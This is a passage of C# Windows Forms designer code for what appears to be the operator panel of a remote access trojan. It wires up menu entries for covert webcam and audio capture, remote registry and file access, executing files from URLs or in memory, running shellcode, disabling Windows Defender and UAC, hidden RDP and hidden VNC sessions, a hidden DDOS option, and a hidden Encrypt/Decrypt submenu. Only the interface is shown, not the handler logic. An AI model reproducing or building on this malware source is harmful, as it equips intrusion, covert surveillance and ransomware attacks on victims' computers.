			toolStripMenuItem4.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem4.Image");
			toolStripMenuItem4.Name = "toolStripMenuItem4";
			toolStripMenuItem4.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem4.Text = "     Remote Camera";
			toolStripMenuItem4.Click += new System.EventHandler(RemoteCameraToolStripMenuItem_Click);
			toolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem5.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem5.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem5.Image");
			toolStripMenuItem5.Name = "toolStripMenuItem5";
			toolStripMenuItem5.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem5.Text = "     Remote Regedit";
			toolStripMenuItem5.Click += new System.EventHandler(remoteRegeditToolStripMenuItem_Click);
			toolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem6.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem6.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem6.Image");
			toolStripMenuItem6.Name = "toolStripMenuItem6";
			toolStripMenuItem6.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem6.Text = "     File Manager";
			toolStripMenuItem6.Click += new System.EventHandler(FileManagerToolStripMenuItem1_Click);
			toolStripMenuItem81.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem81.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem81.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem81.Image");
			toolStripMenuItem81.Name = "toolStripMenuItem81";
			toolStripMenuItem81.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem81.Text = "     File Search";
			toolStripMenuItem81.Click += new System.EventHandler(FileSearchToolStripMenuItem_Click);
			toolStripMenuItem7.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem7.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem7.Image");
			toolStripMenuItem7.Name = "toolStripMenuItem7";
			toolStripMenuItem7.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem7.Text = "     Process Manager";
			toolStripMenuItem7.Click += new System.EventHandler(ProcessManagerToolStripMenuItem_Click);
			toolStripMenuItem8.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem8.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem8.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem8.Image");
			toolStripMenuItem8.Name = "toolStripMenuItem8";
			toolStripMenuItem8.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem8.Text = "     Connections";
			toolStripMenuItem8.Click += new System.EventHandler(netstatToolStripMenuItem_Click);
			toolStripMenuItem9.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem9.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem9.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem9.Image");
			toolStripMenuItem9.Name = "toolStripMenuItem9";
			toolStripMenuItem9.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem9.Text = "     Remote Record";
			toolStripMenuItem9.Click += new System.EventHandler(RecordToolStripMenuItem_Click);
			toolStripMenuItem10.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem10.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripMenuItem11, toolStripMenuItem12 });
			toolStripMenuItem10.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem10.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem10.Image");
			toolStripMenuItem10.Name = "toolStripMenuItem10";
			toolStripMenuItem10.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem10.Text = "     Program Notification";
			toolStripMenuItem11.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem11.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem11.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem11.Image");
			toolStripMenuItem11.Name = "toolStripMenuItem11";
			toolStripMenuItem11.Size = new System.Drawing.Size(132, 36);
			toolStripMenuItem11.Text = "     Start";
			toolStripMenuItem11.Click += new System.EventHandler(StartToolStripMenuItem1_Click);
			toolStripMenuItem12.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem12.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem12.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem12.Image");
			toolStripMenuItem12.Name = "toolStripMenuItem12";
			toolStripMenuItem12.Size = new System.Drawing.Size(132, 36);
			toolStripMenuItem12.Text = "     Stop";
			toolStripMenuItem12.Click += new System.EventHandler(StopToolStripMenuItem2_Click);
			toolStripMenuItem76.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem76.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem76.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem76.Image");
			toolStripMenuItem76.Name = "toolStripMenuItem76";
			toolStripMenuItem76.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem76.Text = "     MessageBox";
			toolStripMenuItem76.Click += new System.EventHandler(MessageBoxToolStripMenuItem_Click);
			toolStripMenuItem77.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem77.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem77.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem77.Image");
			toolStripMenuItem77.Name = "toolStripMenuItem77";
			toolStripMenuItem77.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem77.Text = "     Chat Room";
			toolStripMenuItem77.Click += new System.EventHandler(ChatToolStripMenuItem1_Click);
			toolStripMenuItem79.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem79.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem79.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem79.Image");
			toolStripMenuItem79.Name = "toolStripMenuItem79";
			toolStripMenuItem79.Size = new System.Drawing.Size(220, 36);
			toolStripMenuItem79.Text = "     Change Wallpaper";
			toolStripMenuItem79.Visible = false;
			toolStripMenuItem79.Click += new System.EventHandler(ChangeWallpaperToolStripMenuItem1_Click);
			toolStripMenuItem13.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { toolStripMenuItem71, toolStripMenuItem78, silentInstallerToolStripMenuItem });
			toolStripMenuItem13.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem13.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem13.Image");
			toolStripMenuItem13.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem13.Name = "toolStripMenuItem13";
			toolStripMenuItem13.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem13.Text = "      [Remote Execution]";
			toolStripMenuItem71.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem71.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { toolStripMenuItem72, toolStripMenuItem73, toolStripMenuItem74, executeVBSToolStripMenuItem, mergeRegToolStripMenuItem, executebatToolStripMenuItem, toolStripMenuItem75 });
			toolStripMenuItem71.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem71.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem71.Image");
			toolStripMenuItem71.Name = "toolStripMenuItem71";
			toolStripMenuItem71.Size = new System.Drawing.Size(184, 36);
			toolStripMenuItem71.Text = "     Execute File";
			toolStripMenuItem72.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem72.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem72.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem72.Image");
			toolStripMenuItem72.Name = "toolStripMenuItem72";
			toolStripMenuItem72.Size = new System.Drawing.Size(219, 36);
			toolStripMenuItem72.Text = "     From Url";
			toolStripMenuItem72.Click += new System.EventHandler(fromUrlToolStripMenuItem_Click);
			toolStripMenuItem73.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem73.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem73.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem73.Image");
			toolStripMenuItem73.Name = "toolStripMenuItem73";
			toolStripMenuItem73.Size = new System.Drawing.Size(219, 36);
			toolStripMenuItem73.Text = "     Send File To Disk";
			toolStripMenuItem73.Click += new System.EventHandler(SendFileToDiskToolStripMenuItem_Click);
			toolStripMenuItem74.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem74.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem74.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem74.Image");
			toolStripMenuItem74.Name = "toolStripMenuItem74";
			toolStripMenuItem74.Size = new System.Drawing.Size(219, 36);
			toolStripMenuItem74.Text = "     Send File To Memory";
			toolStripMenuItem74.Click += new System.EventHandler(SendFileToMemoryToolStripMenuItem_Click);
			executeVBSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			executeVBSToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			executeVBSToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("executeVBSToolStripMenuItem.Image");
			executeVBSToolStripMenuItem.Name = "executeVBSToolStripMenuItem";
			executeVBSToolStripMenuItem.Size = new System.Drawing.Size(219, 36);
			executeVBSToolStripMenuItem.Text = "     Execute VBS";
			executeVBSToolStripMenuItem.Click += new System.EventHandler(executeVBSToolStripMenuItem_Click);
			mergeRegToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			mergeRegToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			mergeRegToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("mergeRegToolStripMenuItem.Image");
			mergeRegToolStripMenuItem.Name = "mergeRegToolStripMenuItem";
			mergeRegToolStripMenuItem.Size = new System.Drawing.Size(219, 36);
			mergeRegToolStripMenuItem.Text = "     Merge .reg";
			mergeRegToolStripMenuItem.Click += new System.EventHandler(mergeRegToolStripMenuItem_Click);
			executebatToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			executebatToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			executebatToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("executebatToolStripMenuItem.Image");
			executebatToolStripMenuItem.Name = "executebatToolStripMenuItem";
			executebatToolStripMenuItem.Size = new System.Drawing.Size(219, 36);
			executebatToolStripMenuItem.Text = "     Execute .bat";
			executebatToolStripMenuItem.Click += new System.EventHandler(executebatToolStripMenuItem_Click);
			toolStripMenuItem75.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem75.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem75.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem75.Image");
			toolStripMenuItem75.Name = "toolStripMenuItem75";
			toolStripMenuItem75.Size = new System.Drawing.Size(219, 36);
			toolStripMenuItem75.Text = "     Run Shellcode";
			toolStripMenuItem75.Click += new System.EventHandler(runShellcodeToolStripMenuItem_Click);
			toolStripMenuItem78.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem78.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem78.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem78.Image");
			toolStripMenuItem78.Name = "toolStripMenuItem78";
			toolStripMenuItem78.Size = new System.Drawing.Size(184, 36);
			toolStripMenuItem78.Text = "     Visit Website";
			toolStripMenuItem78.Click += new System.EventHandler(VisteWebsiteToolStripMenuItem1_Click);
			silentInstallerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			silentInstallerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			silentInstallerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("silentInstallerToolStripMenuItem.Image");
			silentInstallerToolStripMenuItem.Name = "silentInstallerToolStripMenuItem";
			silentInstallerToolStripMenuItem.Size = new System.Drawing.Size(184, 36);
			silentInstallerToolStripMenuItem.Text = "     Silent Installer";
			silentInstallerToolStripMenuItem.Visible = false;
			toolStripMenuItem25.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { toolStripMenuItem26, toolStripMenuItem27, toolStripMenuItem30, toolStripMenuItem32 });
			toolStripMenuItem25.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem25.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem25.Image");
			toolStripMenuItem25.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem25.Name = "toolStripMenuItem25";
			toolStripMenuItem25.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem25.Text = "      [Defeat Remote Firewall]";
			toolStripMenuItem26.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem26.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem26.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem26.Image");
			toolStripMenuItem26.Name = "toolStripMenuItem26";
			toolStripMenuItem26.Size = new System.Drawing.Size(172, 36);
			toolStripMenuItem26.Text = "     DDOS";
			toolStripMenuItem26.Visible = false;
			toolStripMenuItem26.Click += new System.EventHandler(dDOSToolStripMenuItem_Click);
			toolStripMenuItem27.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem27.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripMenuItem28, toolStripMenuItem29 });
			toolStripMenuItem27.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem27.Image = Properties.Resources.IDI_APPICON__2__result;
			toolStripMenuItem27.Name = "toolStripMenuItem27";
			toolStripMenuItem27.Size = new System.Drawing.Size(172, 36);
			toolStripMenuItem27.Text = "dead";
			toolStripMenuItem27.Visible = false;
			toolStripMenuItem28.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem28.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem28.Name = "toolStripMenuItem28";
			toolStripMenuItem28.Size = new System.Drawing.Size(119, 22);
			toolStripMenuItem28.Text = "Encrypt";
			toolStripMenuItem28.Click += new System.EventHandler(EncryptToolStripMenuItem_Click);
			toolStripMenuItem29.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem29.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem29.Name = "toolStripMenuItem29";
			toolStripMenuItem29.Size = new System.Drawing.Size(119, 22);
			toolStripMenuItem29.Text = "Decrypt";
			toolStripMenuItem29.Click += new System.EventHandler(DecryptToolStripMenuItem_Click);
			toolStripMenuItem30.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem30.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem30.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem30.Image");
			toolStripMenuItem30.Name = "toolStripMenuItem30";
			toolStripMenuItem30.Size = new System.Drawing.Size(172, 36);
			toolStripMenuItem30.Text = "     Disable WD";
			toolStripMenuItem30.Click += new System.EventHandler(DisableWDToolStripMenuItem_Click);
			toolStripMenuItem32.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem32.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem32.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem32.Image");
			toolStripMenuItem32.Name = "toolStripMenuItem32";
			toolStripMenuItem32.Size = new System.Drawing.Size(172, 36);
			toolStripMenuItem32.Text = "     Disable UAC";
			toolStripMenuItem32.Click += new System.EventHandler(DisableUACToolStripMenuItem_Click);
			toolStripMenuItem33.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripMenuItem40, toolStripMenuItem34 });
			toolStripMenuItem33.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem33.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem33.Image");
			toolStripMenuItem33.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem33.Name = "toolStripMenuItem33";
			toolStripMenuItem33.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem33.Text = "      [System Control]";
			toolStripMenuItem40.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem40.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { toolStripMenuItem41, toolStripMenuItem42, toolStripMenuItem43 });
			toolStripMenuItem40.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem40.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem40.Image");
			toolStripMenuItem40.Name = "toolStripMenuItem40";
			toolStripMenuItem40.Size = new System.Drawing.Size(183, 36);
			toolStripMenuItem40.Text = "      System";
			toolStripMenuItem41.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem41.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem41.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem41.Image");
			toolStripMenuItem41.Name = "toolStripMenuItem41";
			toolStripMenuItem41.Size = new System.Drawing.Size(166, 36);
			toolStripMenuItem41.Text = "      Shut Down";
			toolStripMenuItem41.Click += new System.EventHandler(ShutDownToolStripMenuItem_Click);
			toolStripMenuItem42.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem42.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem42.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem42.Image");
			toolStripMenuItem42.Name = "toolStripMenuItem42";
			toolStripMenuItem42.Size = new System.Drawing.Size(166, 36);
			toolStripMenuItem42.Text = "      Reboot";
			toolStripMenuItem42.Click += new System.EventHandler(RebootToolStripMenuItem_Click);
			toolStripMenuItem43.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem43.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem43.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem43.Image");
			toolStripMenuItem43.Name = "toolStripMenuItem43";
			toolStripMenuItem43.Size = new System.Drawing.Size(166, 36);
			toolStripMenuItem43.Text = "      Logout";
			toolStripMenuItem43.Click += new System.EventHandler(LogoutToolStripMenuItem_Click);
			toolStripMenuItem34.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem34.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { toolStripMenuItem35, toolStripMenuItem36, toolStripMenuItem37, toolStripMenuItem38, toolStripMenuItem39 });
			toolStripMenuItem34.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem34.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem34.Image");
			toolStripMenuItem34.Name = "toolStripMenuItem34";
			toolStripMenuItem34.Size = new System.Drawing.Size(183, 36);
			toolStripMenuItem34.Text = "      Client Control";
			toolStripMenuItem35.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem35.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem35.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem35.Image");
			toolStripMenuItem35.Name = "toolStripMenuItem35";
			toolStripMenuItem35.Size = new System.Drawing.Size(177, 36);
			toolStripMenuItem35.Text = "      Stop";
			toolStripMenuItem35.Click += new System.EventHandler(StopToolStripMenuItem1_Click);
			toolStripMenuItem36.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem36.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem36.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem36.Image");
			toolStripMenuItem36.Name = "toolStripMenuItem36";
			toolStripMenuItem36.Size = new System.Drawing.Size(177, 36);
			toolStripMenuItem36.Text = "      Restart";
			toolStripMenuItem36.Click += new System.EventHandler(RestartToolStripMenuItem1_Click);
			toolStripMenuItem37.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem37.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem37.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem37.Image");
			toolStripMenuItem37.Name = "toolStripMenuItem37";
			toolStripMenuItem37.Size = new System.Drawing.Size(177, 36);
			toolStripMenuItem37.Text = "      Update";
			toolStripMenuItem37.Click += new System.EventHandler(UPDATEToolStripMenuItem1_Click);
			toolStripMenuItem38.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem38.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem38.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem38.Image");
			toolStripMenuItem38.Name = "toolStripMenuItem38";
			toolStripMenuItem38.Size = new System.Drawing.Size(177, 36);
			toolStripMenuItem38.Text = "      Uninstall";
			toolStripMenuItem38.Click += new System.EventHandler(UninstallToolStripMenuItem_Click);
			toolStripMenuItem39.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem39.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem39.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem39.Image");
			toolStripMenuItem39.Name = "toolStripMenuItem39";
			toolStripMenuItem39.Size = new System.Drawing.Size(177, 36);
			toolStripMenuItem39.Text = "      Client Folder";
			toolStripMenuItem39.Click += new System.EventHandler(ClientFolderToolStripMenuItem_Click);
			hiddenRDPToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { HRDPconnectToolStripMenuItem, copyProfileToolStripMenuItem, connectToolStripMenuItem, HRDPcleanUnistallToolStripMenuItem });
			hiddenRDPToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			hiddenRDPToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hiddenRDPToolStripMenuItem.Image");
			hiddenRDPToolStripMenuItem.Name = "hiddenRDPToolStripMenuItem";
			hiddenRDPToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			hiddenRDPToolStripMenuItem.Text = "      [Hidden RDP]";
			hiddenRDPToolStripMenuItem.Visible = false;
			HRDPconnectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			HRDPconnectToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			HRDPconnectToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HRDPconnectToolStripMenuItem.Image");
			HRDPconnectToolStripMenuItem.Name = "HRDPconnectToolStripMenuItem";
			HRDPconnectToolStripMenuItem.Size = new System.Drawing.Size(193, 36);
			HRDPconnectToolStripMenuItem.Text = "     1.  Install";
			HRDPconnectToolStripMenuItem.Click += new System.EventHandler(HRDPconnectToolStripMenuItem_Click);
			copyProfileToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			copyProfileToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			copyProfileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("copyProfileToolStripMenuItem.Image");
			copyProfileToolStripMenuItem.Name = "copyProfileToolStripMenuItem";
			copyProfileToolStripMenuItem.Size = new System.Drawing.Size(193, 36);
			copyProfileToolStripMenuItem.Text = "     2.  Copy Profile";
			copyProfileToolStripMenuItem.Click += new System.EventHandler(copyProfileToolStripMenuItem_Click);
			HRDPcleanUnistallToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			HRDPcleanUnistallToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			HRDPcleanUnistallToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HRDPcleanUnistallToolStripMenuItem.Image");
			HRDPcleanUnistallToolStripMenuItem.Name = "HRDPcleanUnistallToolStripMenuItem";
			HRDPcleanUnistallToolStripMenuItem.Size = new System.Drawing.Size(193, 36);
			HRDPcleanUnistallToolStripMenuItem.Text = "     Clean/Unistall";
			HRDPcleanUnistallToolStripMenuItem.Click += new System.EventHandler(HRDPcleanUnistallToolStripMenuItem_Click);
			connectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			connectToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			connectToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("connectToolStripMenuItem.Image");
			connectToolStripMenuItem.Name = "connectToolStripMenuItem";
			connectToolStripMenuItem.Size = new System.Drawing.Size(193, 36);
			connectToolStripMenuItem.Text = "     3. Connect";
			connectToolStripMenuItem.Click += new System.EventHandler(connectToolStripMenuItem_Click);
			hVNChBrowsersToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { hVNCCToolStripMenuItem, hVNCCToolStripMenuItem1 });
			hVNChBrowsersToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			hVNChBrowsersToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hVNChBrowsersToolStripMenuItem.Image");
			hVNChBrowsersToolStripMenuItem.Name = "hVNChBrowsersToolStripMenuItem";
			hVNChBrowsersToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			hVNChBrowsersToolStripMenuItem.Text = "      [hVNC/hBrowsers]";
			hVNCCToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			hVNCCToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { uploadsPluginToolStripMenuItem, toolStripMenuItem84, toolStripMenuItem85 });
			hVNCCToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			hVNCCToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hVNCCToolStripMenuItem.Image");
			hVNCCToolStripMenuItem.Name = "hVNCCToolStripMenuItem";
			hVNCCToolStripMenuItem.Size = new System.Drawing.Size(254, 36);
			hVNCCToolStripMenuItem.Text = "    HVNC C++";
			uploadsPluginToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			uploadsPluginToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			uploadsPluginToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("uploadsPluginToolStripMenuItem.Image");
			uploadsPluginToolStripMenuItem.Name = "uploadsPluginToolStripMenuItem";
			uploadsPluginToolStripMenuItem.Size = new System.Drawing.Size(180, 36);
			uploadsPluginToolStripMenuItem.Text = "    Activate";
			uploadsPluginToolStripMenuItem.Visible = false;
			uploadsPluginToolStripMenuItem.Click += new System.EventHandler(uploadsPluginToolStripMenuItem_Click);
			toolStripMenuItem84.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem84.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem84.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem84.Image");
			toolStripMenuItem84.Name = "toolStripMenuItem84";
			toolStripMenuItem84.Size = new System.Drawing.Size(180, 36);
			toolStripMenuItem84.Text = "    Connect";
			toolStripMenuItem84.Click += new System.EventHandler(startToolStripMenuItem2_Click);
			toolStripMenuItem85.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem85.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem85.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem85.Image");
			toolStripMenuItem85.Name = "toolStripMenuItem85";
			toolStripMenuItem85.Size = new System.Drawing.Size(180, 36);
			toolStripMenuItem85.Text = "    Clean/Unistall";
			toolStripMenuItem85.Click += new System.EventHandler(stopToolStripMenuItem3_Click);
			hVNCCToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			hVNCCToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { hVNCCStartToolStripMenuItem, stopToolStripMenuItem3 });
			hVNCCToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			hVNCCToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("hVNCCToolStripMenuItem1.Image");
			hVNCCToolStripMenuItem1.Name = "hVNCCToolStripMenuItem1";
			hVNCCToolStripMenuItem1.Size = new System.Drawing.Size(254, 36);
			hVNCCToolStripMenuItem1.Text = "    HVNC C#(Under Heavy Dev)";
			hVNCCToolStripMenuItem1.Visible = false;
			hVNCCStartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			hVNCCStartToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			hVNCCStartToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hVNCCStartToolStripMenuItem.Image");
			hVNCCStartToolStripMenuItem.Name = "hVNCCStartToolStripMenuItem";
			hVNCCStartToolStripMenuItem.Size = new System.Drawing.Size(129, 36);
			hVNCCStartToolStripMenuItem.Text = "    Start";
			hVNCCStartToolStripMenuItem.Click += new System.EventHandler(hVNCCStartToolStripMenuItem_Click);
			stopToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stopToolStripMenuItem3.ForeColor = System.Drawing.Color.LightGray;
			stopToolStripMenuItem3.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem3.Image");
			stopToolStripMenuItem3.Name = "stopToolStripMenuItem3";
			stopToolStripMenuItem3.Size = new System.Drawing.Size(129, 36);
			stopToolStripMenuItem3.Text = "    Stop";
			toolStripMenuItem44.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { toolStripMenuItem45, toolStripMenuItem46, toolStripMenuItem48, toolStripMenuItem47 });
			toolStripMenuItem44.ForeColor = System.Drawing.Color.LightGray;
